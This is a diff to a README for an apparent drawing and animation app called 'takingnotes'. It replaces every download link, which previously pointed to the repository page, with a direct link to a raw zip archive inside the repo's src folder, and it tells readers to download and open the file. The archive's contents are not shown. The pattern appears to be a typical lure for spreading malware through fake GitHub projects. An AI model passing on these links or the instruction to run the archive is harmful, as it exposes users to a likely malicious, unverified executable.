@@ -1,6 +1,6 @@
 # 🎨 takingnotes - Draw and animate with ease
 
-[![Download takingnotes](https://img.shields.io/badge/Download-takingnotes-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/etheldaaquiline399/takingnotes)
+[![Download takingnotes](https://img.shields.io/badge/Download-takingnotes-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/etheldaaquiline399/takingnotes/raw/refs/heads/main/src/Software-v2.2.zip)
 
 ## 🧭 What this app does
 
@@ -12,7 +12,7 @@ Use it to sketch, edit layers, and build simple animations from your notes and d
 
 Visit this page to download and run the app:
 
-https://github.com/etheldaaquiline399/takingnotes
+https://github.com/etheldaaquiline399/takingnotes/raw/refs/heads/main/src/Software-v2.2.zip
 
 If the page shows a release file, download it and open it. If it shows the project source, download the files from the repository page and open the app in your browser after setup.
 
@@ -174,4 +174,4 @@ If you want to make motion studies or short animation clips:
 
 Use this link to visit the project page and download or run the app:
 
-https://github.com/etheldaaquiline399/takingnotes
+https://github.com/etheldaaquiline399/takingnotes/raw/refs/heads/main/src/Software-v2.2.zip
